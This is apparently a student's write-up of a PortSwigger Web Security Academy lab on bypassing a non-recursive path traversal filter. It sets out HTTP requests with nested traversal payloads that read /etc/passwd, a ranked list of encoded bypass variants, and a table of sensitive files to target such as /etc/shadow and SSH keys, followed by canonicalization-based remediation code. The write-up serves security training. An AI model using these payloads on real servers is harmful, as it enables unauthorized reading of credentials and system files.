# Lab 3: File Path Traversal — Traversal Sequences Stripped Non-Recursively

## Executive Summary

This lab demonstrates exploitation of a file path traversal vulnerability where the application implements a more deliberate defense than Lab 2 — stripping both relative traversal sequences (`../`) and absolute path inputs (`/etc/passwd`) from the filename parameter before passing it to the filesystem read operation. Both standard bypass techniques fail with 400 Bad Request responses. However, the filter strips traversal sequences only once and does not re-evaluate the result, making it vulnerable to nested traversal payloads. By embedding `../` inside a longer sequence — `....//` — the filter strips the inner `../` and inadvertently reconstructs the exact traversal sequence it intended to remove. The resulting payload `....//....//....//etc/passwd` survives the filter intact as `../../../etc/passwd` and successfully reads `/etc/passwd` from the server filesystem. The complete file contents were returned in the HTTP response, confirming arbitrary filesystem read access via non-recursive filter bypass.

## Lab Details

| Attribute              | Value |
|------------------------|-------|
| **Source**             | PortSwigger Web Security Academy |
| **Topic**              | Path Traversal |
| **Difficulty**         | Practitioner |
| **Vulnerability**      | File Path Traversal — Non-Recursive Traversal Sequence Stripping Bypassed via Nested Sequences |
| **Risk**               | Critical - Arbitrary Filesystem Read via Filter Reconstruction Attack |
| **Completion**         | May 19, 2026 |

## Objective

Exploit a file path traversal vulnerability in the product image `filename` parameter where both relative traversal sequences (`../`) and absolute paths are stripped by a server-side filter. Bypass the non-recursive filter by supplying nested traversal sequences that reconstruct the blocked pattern after stripping, read the contents of `/etc/passwd`, and demonstrate that single-pass string replacement is an inadequate defense against path traversal.

## Testing Setup

**Tools Used:**
- Burp Suite Professional (Licensed to Gurpreet Singh)
- Burp Proxy for traffic interception with active request interception visible in the Proxy Intercept panel
- Burp Repeater for iterative payload testing and response inspection

**Target:** `filename` query parameter in the product image serving endpoint — traversal sequences and absolute paths both stripped by a single-pass filter before reaching the filesystem read operation

## Exploitation Walkthrough

### 1. Initial Reconnaissance

Accessed the lab environment confirming the challenge title "File path traversal, traversal sequences stripped non-recursively" with Burp Suite Professional configured, actively intercepting traffic, and displaying captured requests in the Proxy Intercept panel.


<img width="1920" height="982" alt="LAB3_ss1" src="https://github.com/user-attachments/assets/9e557ae2-7aab-457c-982e-c58c36870c22" />

*Lab 3 Path Traversal environment displaying the traversal sequences stripped non-recursively challenge title (right) | Burp Suite Professional licensed to Gurpreet Singh, configured and active with intercepted request visible in Proxy Intercept panel (left)*

### 2. Attack Surface Identification

Browsed the shop product pages with Burp Proxy intercepting traffic. Identified the product image loading request in HTTP history as the injection surface — a GET request with a `filename` parameter specifying the image file to serve from disk.

<img width="1920" height="982" alt="LAB3_ss2" src="https://github.com/user-attachments/assets/2f777bd8-1984-43a7-80eb-b154c256ceeb" />

*HTTP history showing captured requests — image loading request identified with `filename=45.jpg` highlighted as the user-controlled parameter feeding the server-side file read operation*

**Request Captured:**
```http
GET /image?filename=45.jpg HTTP/1.1
Host: [lab-id].web-security-academy.net
```

**Injection Point:** `filename` parameter — same attack surface as Labs 1 and 2, now with a more comprehensive filter that handles both relative and absolute path inputs.

### 3. Baseline Request Validation

Forwarded the image request to Burp Repeater and sent the unmodified request to confirm the file serving mechanism before attempting traversal.

<img width="1920" height="982" alt="LAB3_ss3" src="https://github.com/user-attachments/assets/6e1763af-c203-4f3f-9835-55aea7b987f5" />


*Original image request sent in Repeater — 200 OK response with raw image binary data and Adobe Photoshop metadata visible in the response body, confirming the server reads and returns raw file contents directly from disk*

**Response:** 200 OK — raw image binary data returned, Adobe Photoshop file metadata present.

**Analysis:** Consistent baseline with Labs 1 and 2. The server reads the specified file from a base directory and returns raw contents. The Photoshop metadata confirms no content transformation occurs — file bytes are served as-is, meaning any file the traversal reaches will have its raw contents returned in the response.

### 4. Standard Traversal Attempt — Blocked

Applied the standard relative traversal payload to test the filter.

**Payload:**
```http
GET /image?filename=../../../etc/passwd HTTP/1.1
```

<img width="1920" height="982" alt="LAB3_ss4" src="https://github.com/user-attachments/assets/82a8a3a8-ce2f-4a8a-9260-2fbe8f037eeb" />


*Standard `../../../etc/passwd` traversal payload submitted — 400 Bad Request confirms the filter is active and blocking relative traversal sequences*

**Response:** 400 Bad Request

**Analysis:** Relative traversal sequences are detected and blocked. The filter is more capable than a simple `../` check — it actively strips or rejects the pattern. Moving to the next bypass technique.

### 5. Absolute Path Bypass Attempt — Also Blocked

Applied the absolute path bypass that succeeded in Lab 2 to determine whether this filter also covers that vector.

**Payload:**
```http
GET /image?filename=/etc/passwd HTTP/1.1
```

<img width="1920" height="982" alt="LAB3_ss5" src="https://github.com/user-attachments/assets/ba8efc51-02ec-4a26-b662-c236be920d3e" />


*Absolute path `/etc/passwd` submitted — 400 Bad Request confirms the filter also blocks absolute path inputs, unlike Lab 2. Both standard bypass vectors are now confirmed blocked*

**Response:** 400 Bad Request

**Analysis:** The application blocks both `../` traversal sequences and leading-slash absolute paths. This is a more thorough filter than Lab 2. Both of the straightforward bypass techniques have been eliminated. The filter is likely performing string stripping or replacement rather than simply rejecting on pattern match — a stripping implementation removes the blocked pattern from the input and passes the remainder to the file read operation, which opens a different class of bypass.

**Filter Behavior Assessment:**

| Payload Tested | Response | Filter Behavior Inferred |
|---------------|----------|--------------------------|
| `../../../etc/passwd` | 400 | `../` sequences detected and blocked/stripped |
| `/etc/passwd` | 400 | Leading `/` or absolute paths detected and blocked/stripped |
| Standard techniques exhausted | — | Non-recursive stripping likely — nested sequences worth testing |

### 6. Nested Traversal Bypass — Filter Reconstructed

The challenge title explicitly states the filter strips traversal sequences "non-recursively" — meaning it performs a single pass over the input, removes the blocked patterns it finds, and passes the result to the file read operation without re-evaluating the output for remaining blocked patterns.

This creates a specific and reliable bypass: embed the blocked sequence inside a longer string in such a way that removing the inner blocked pattern reconstructs the outer blocked pattern. The filter strips `../` from `....//` and produces `../` — the exact sequence it was trying to remove.

**Nested Sequence Construction:**

```
Original blocked sequence:  ../
Nested carrier sequence:    ....//

Strip ../ from ....// :
  ....//
    ^^  ← strip this ../
  Result: ../       ← blocked sequence reconstructed
```

A three-level traversal (`../../../`) using nested sequences:

```
Nested payload:   ....//....//....//etc/passwd
After stripping:  ../../../etc/passwd
```

Each `....//` loses its inner `../` during stripping and collapses to `../`. Three nested sequences produce three traversal levels — sufficient to reach the filesystem root from the standard web images directory.

**Attack Payload:**
```http
GET /image?filename=....//....//....//etc/passwd HTTP/1.1
```

**Filter Processing — Step by Step:**

```
Input:            ....//....//....//etc/passwd

Filter scans for ../  →  finds ../ at position 2 in first ....//
Strips first ../:       ../etc/passwd  ← wait, let's trace carefully

Full trace:
  ....//  →  strip the embedded ../  →  ../   (outer .. and / remain)
  ....//  →  strip the embedded ../  →  ../
  ....//  →  strip the embedded ../  →  ../
  etc/passwd  →  no pattern to strip  →  etc/passwd

Output after single-pass strip:  ../../../etc/passwd

File read resolves:  /var/www/images/../../../etc/passwd  →  /etc/passwd
```

The filter removes what it finds in one pass and does not loop back to check whether its own stripping operation created new instances of the blocked pattern. The output `../../../etc/passwd` is passed to the filesystem read operation unchanged.

<img width="1920" height="982" alt="LAB3_ss6" src="https://github.com/user-attachments/assets/f3b3d726-ccea-4573-9acd-083bc1a4d464" />


*Nested traversal payload `....//....//....//etc/passwd` submitted — 200 OK response returns the complete contents of `/etc/passwd` including root, daemon, bin, sys, and all configured system account entries. Non-recursive filter bypassed via sequence reconstruction*

**Response:** 200 OK — complete contents of `/etc/passwd` returned.

**Response Contents Included:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
[all remaining account entries...]
```

**Bypass Confirmed:**
- `../` filter stripped the inner `../` from each `....//` group
- Single-pass stripping reconstructed `../../../etc/passwd` as the output
- Reconstructed path resolved to `/etc/passwd` on the server filesystem
- Complete file contents returned in HTTP response

### 7. Lab Objective Achieved

<img width="1920" height="982" alt="LAB3_ss7" src="https://github.com/user-attachments/assets/569ccf5a-0d77-4e9e-821c-611f14d7d0c8" />


*Repeater showing complete `/etc/passwd` contents in the response panel with all system account credentials exposed (left) | Lab completion confirmation — "Congratulations, you solved the lab!" visible in the browser (right)*

**Lab completion confirmed: "Congratulations, you solved the lab!"**

## Technical Impact

**Severity: Critical (CVSS 9.1)**

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
```

**Primary Vulnerabilities:**

**CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)**
- `filename` parameter value reaches the filesystem read operation after incomplete sanitization
- Filter strips traversal sequences in a single pass, allowing reconstruction via nested patterns
- Resolved path escapes the intended base directory and accesses arbitrary filesystem locations

**CWE-182: Collapse of Data into Unsafe Value**
- The stripping operation transforms a "safe" nested input into an unsafe traversal sequence
- The filter's own processing creates the attack payload it was designed to prevent
- Single-pass sanitization of path sequences is insufficient when the output is not re-validated

**Complete Attack Chain:**

```
Image Filename Parameter Identified as Injection Surface
        ↓
Baseline Confirms Raw File Contents Served from Disk
        ↓
../../../etc/passwd Submitted → 400 Bad Request (../ Blocked)
        ↓
/etc/passwd Submitted → 400 Bad Request (Absolute Path Blocked)
        ↓
Filter Analysis: Non-Recursive Stripping — Single Pass Only
        ↓
Nested Sequence ....// Constructed: Strip ../ → Produces ../
        ↓
....//....//....//etc/passwd Submitted
        ↓
Filter Strips Inner ../ from Each ....// Group — Single Pass
        ↓
Output After Strip: ../../../etc/passwd
        ↓
Reconstructed Path Passed to Filesystem Read Operation
        ↓
/etc/passwd Resolved and Read
        ↓
Complete File Contents Returned in HTTP Response
```

**Why Non-Recursive Stripping Fails:**

String sanitization that modifies its input creates a class of vulnerabilities called filter reconstruction attacks. The sanitization operation itself generates the dangerous output. This is not specific to path traversal — the same principle applies to XSS filters that strip `<script>` non-recursively, producing `<script>` from `<scr<script>ipt>`, and to SQL injection filters that strip comments non-recursively.

The correct mental model for any sanitization pass is: after I modify this string, does the output require re-evaluation? If the answer is "yes in any case," a loop is required. Single-pass sanitization is only safe when the transformation cannot produce new instances of the blocked pattern — which is not the case for string replacement of `../`.

**Filter Implementation Comparison:**

| Implementation | Blocks `../../../` | Blocks `....//....//` | Correct |
|----------------|--------------------|-----------------------|---------|
| Single-pass string replace `../` → `""` | Yes | No — reconstructs after stripping | No |
| Recursive string replace until stable | Yes | Yes | Partial — still wrong layer |
| Path canonicalization + boundary check | Yes | Yes | Yes |
| Allowlist of known-good filenames | Yes | Yes | Yes — most robust |

Even recursive stripping — looping until no blocked pattern remains — is not a correct implementation. A sufficiently crafted nested payload can still survive recursive stripping in edge cases, and the filter still operates at the wrong layer. Canonicalization followed by boundary validation is the only approach that is correct by construction.

**Nested Traversal Variants Across Encodings:**

The `....//` pattern is one member of a broader family of nested bypass sequences. The specific form needed depends on what characters the filter strips and how it handles partial matches:

| Nested Payload | Inner Pattern Stripped | Result After Strip |
|---------------|----------------------|-------------------|
| `....//` | `../` | `../` |
| `..././` | `./` | `../` |
| `....\/` | `..\` | `..\` (Windows) |
| `%2e%2e%2f` URL-decoded, then stripped | `../` decoded | `../` reconstructed if double-encoded |

The appropriate variant depends on what the filter targets. In this lab, `....//` is the correct form because the filter strips `../` — the two dots and forward slash in the middle of `....//`.

**Real-World Impact:**

| Target File | Contents | Consequence |
|-------------|----------|-------------|
| `/etc/passwd` | System accounts (used here) | User enumeration, account mapping |
| `/etc/shadow` | Password hashes | Offline credential cracking |
| `/proc/self/environ` | Environment variables | Application secrets, API keys |
| `/var/www/html/config.php` | Database credentials | Full application database access |
| `~/.ssh/id_rsa` | SSH private key | Direct server authentication |
| `/var/log/apache2/access.log` | HTTP access logs | Traffic analysis, internal path discovery |

## Key Takeaways

**Penetration Testing Methodology Applied:**
- Test standard techniques first to establish what the filter blocks before attempting bypass
- Treat each blocked response as information about filter behavior, not as a dead end
- When both `../` and `/` are blocked, consider non-recursive stripping as the likely implementation
- Construct nested sequences that survive stripping by embedding the blocked pattern inside a longer carrier
- Validate bypass with the simplest possible nested form before reaching for more complex encoding variants

**Critical Security Insights:**

**1. Non-Recursive Stripping Is Worse Than No Filter:**
A non-recursive strip creates a false sense of security — the filter activates on the straightforward attacks, making the application appear defended. The nested bypass is slightly less obvious but still well-documented and straightforward. A developer seeing 400 responses to standard traversal payloads may conclude the implementation is secure without testing nested variants.

**2. Any Sanitization That Can Reconstruct the Blocked Pattern Is Incorrect:**
The test for a sanitization implementation is not "does it block the obvious payload" but "can any input survive this transformation and still produce the blocked pattern in the output." For string replacement of `../`, the answer is always yes — `....//` demonstrates this immediately. Sanitization implementations must be evaluated for their failure modes, not just their success cases.

**3. The Correct Fix Has Not Changed Across Labs 1, 2, and 3:**
The vulnerability in all three labs has the same root cause and the same correct fix — path canonicalization followed by base directory boundary enforcement. The filter implementations vary (none, absolute-path blocking, non-recursive stripping) but the remediation is identical in each case:

```python
import os

base_dir = "/var/www/images/"
user_input = request.GET["filename"]

# Canonicalize — resolve ALL path manipulation before validation
canonical = os.path.realpath(os.path.join(base_dir, user_input))

# Validate against the resolved path, not the raw input string
if not canonical.startswith(os.path.realpath(base_dir) + os.sep):
    return 400

return open(canonical, "rb").read()
```

Under this implementation, `....//....//....//etc/passwd` is canonicalized to `/etc/passwd` before the check runs. The check sees `/etc/passwd`, not the nested form, and correctly rejects it. No filter logic is needed because the OS resolves the path and the check validates the result.

**4. Penetration Testing Path Traversal — Systematic Bypass Order:**
When testing a path traversal filter, the correct order of escalation is:

```
1. ../../../etc/passwd          — baseline, no filter
2. /etc/passwd                  — absolute path bypass
3. ....//....//....//etc/passwd — non-recursive strip bypass
4. %2e%2e%2f%2e%2e%2fetc/passwd — URL-encoded traversal
5. %252e%252e%252fetc%252fpasswd — double URL-encoded
6. ..%c0%af../..%c0%afetc/passwd — Unicode separator variants
7. ..;/etc/passwd               — semicolon separator (some frameworks)
```

Each step reveals more about the filter's implementation. Stopping after the first blocked response without continuing through the bypass sequence is a common assessment gap.

**5. The Lab Series Demonstrates Defense Depth Failures:**
Labs 1, 2, and 3 present progressively more capable filters, each of which fails. The pattern reinforces that path traversal defenses implemented at the input string level — regardless of their sophistication — are fundamentally less reliable than canonicalization-based validation at the path resolution level. The lesson is not "implement a better filter" but "stop filtering and start validating the resolved path."

## References

1. PortSwigger Web Security Academy - Path Traversal
2. PortSwigger Web Security Academy - Bypassing Path Traversal Defenses
3. OWASP Top 10 (2021) - A01: Broken Access Control
4. CWE-22 - Improper Limitation of a Pathname to a Restricted Directory
5. CWE-182 - Collapse of Data into Unsafe Value
6. OWASP Path Traversal Attack Reference
7. OWASP Input Validation Cheat Sheet

---

## Legal Notice

**Copyright © 2026 Gurpreet Singh**
Licensed under CC BY-NC-ND 4.0

**Repository:** https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs

**Disclaimer:** This documentation is for authorized security testing and educational purposes only. All techniques were performed in a controlled laboratory environment with explicit permission. Unauthorized access to server filesystems, filter bypass attempts, or exploitation of path traversal vulnerabilities against systems without explicit written authorization is illegal under applicable laws worldwide.
